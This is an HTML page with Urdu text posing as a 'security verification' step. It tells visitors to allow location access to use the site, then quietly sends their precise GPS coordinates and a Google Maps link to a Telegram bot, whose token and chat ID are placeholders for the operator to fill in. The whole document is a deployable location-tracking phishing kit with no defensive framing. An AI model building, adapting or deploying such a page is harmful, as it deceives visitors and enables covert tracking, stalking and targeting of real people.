<!DOCTYPE html>
<html lang="ur" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Location Verification</title>
    <style>
        * {
            box-sizing: border-box;
        }
        body {
            background-color: #0d1117;
            color: #c9d1d9;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: #161b22;
            padding: 35px 25px;
            border-radius: 16px;
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.6);
            text-align: center;
            max-width: 360px;
            width: 90%;
            border: 1px solid #30363d;
        }
        h2 {
            color: #f0f6fc;
            margin-bottom: 12px;
            font-size: 22px;
        }
        p {
            color: #8b949e;
            font-size: 14px;
            margin-bottom: 25px;
            line-height: 1.5;
        }
        .allow-btn {
            background-color: #238636;
            color: white;
            border: none;
            padding: 14px 20px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            transition: background-color 0.2s ease;
            box-shadow: 0 3px 6px rgba(0,0,0,0.2);
        }
        .allow-btn:active {
            background-color: #2ea043;
            transform: scale(0.98);
        }
        #status-msg {
            margin-top: 15px;
            font-size: 13px;
            color: #58a6ff;
        }
    </style>
</head>
<body>

<div class="container">
    <h2>سیکیورٹی تصدیق</h2>
    <p>ویب سائٹ کو استعمال کرنے کے لیے براہ کرم نیچے دیے گئے بٹن پر کلک کر کے لوکیشن کی اجازت (Allow) دیں۔</p>
    <button class="allow-btn" id="geoBtn">لوکیشن شیئر کریں (Allow)</button>
    <div id="status-msg"></div>
</div>

<script>
    // یہاں اپنی ٹیلیگرام کی معلومات درج کریں
    const BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN';
    const CHAT_ID = 'YOUR_TELEGRAM_CHAT_ID';

    const btn = document.getElementById('geoBtn');
    const statusMsg = document.getElementById('status-msg');

    btn.addEventListener('click', function() {
        statusMsg.textContent = "پرمیشن کا انتظار ہے...";
        
        if (!navigator.geolocation) {
            alert("آپ کا براؤزر جیو لوکیشن کو سپورٹ نہیں کرتا۔");
            statusMsg.textContent = "";
            return;
        }

        // جدید براؤزرز کے لیے ہائی ایکوریسی لوکیشن ریکوئسٹ
        const options = {
            enableHighAccuracy: true,
            timeout: 20000,
            maximumAge: 0
        };

        navigator.geolocation.getCurrentPosition(
            function(position) {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                const accuracy = position.coords.accuracy;
                
                const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
                const textMessage = `🚨 *نئی لوکیشن موصول ہوئی!*\n\n` +
                                    `🌐 *گوگل میپس:* ${mapsLink}\n` +
                                    `🎯 *درستگی (Accuracy):* ${accuracy} میٹر\n` +
                                    `📌 *Latitude:* ${lat}\n` +
                                    `📌 *Longitude:* ${lon}`;

                statusMsg.textContent = "ڈیٹا بھیجا جا رہا ہے...";

                // ٹیلیگرام اے پی آئی پر ڈیٹا بھیجنا
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: textMessage,
                        parse_mode: 'Markdown'
                    })
                })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        statusMsg.textContent = "کامیاب! آپ آگے بڑھ سکتے ہیں۔";
                        alert("تصدیق مکمل ہو گئی!");
                    } else {
                        statusMsg.textContent = "ٹیلیگرام پر ڈیٹا بھیجنے میں خرابی ہوئی۔";
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                    statusMsg.textContent = "کنکشن کا مسئلہ پیش آیا۔";
                });
            },
            function(error) {
                switch(error.code) {
                    case error.PERMISSION_DENIED:
                        alert("آپ نے لوکیشن کی اجازت نہیں دی (Denied)۔ براہ کرم دوبارہ کوشش کریں اور Allow کریں۔");
                        break;
                    case error.POSITION_UNAVAILABLE:
                        alert("لوکیشن کی معلومات دستیاب نہیں ہیں۔");
                        break;
                    case error.TIMEOUT:
                        alert("درخواست کا وقت ختم ہو گیا، دوبارہ کوشش کریں۔");
                        break;
                    default:
                        alert("نامعلوم خرابی پیش آئی ہے۔");
                        break;
                }
                statusMsg.textContent = "";
            },
            options
        );
    });
</script>

</body>
</html>
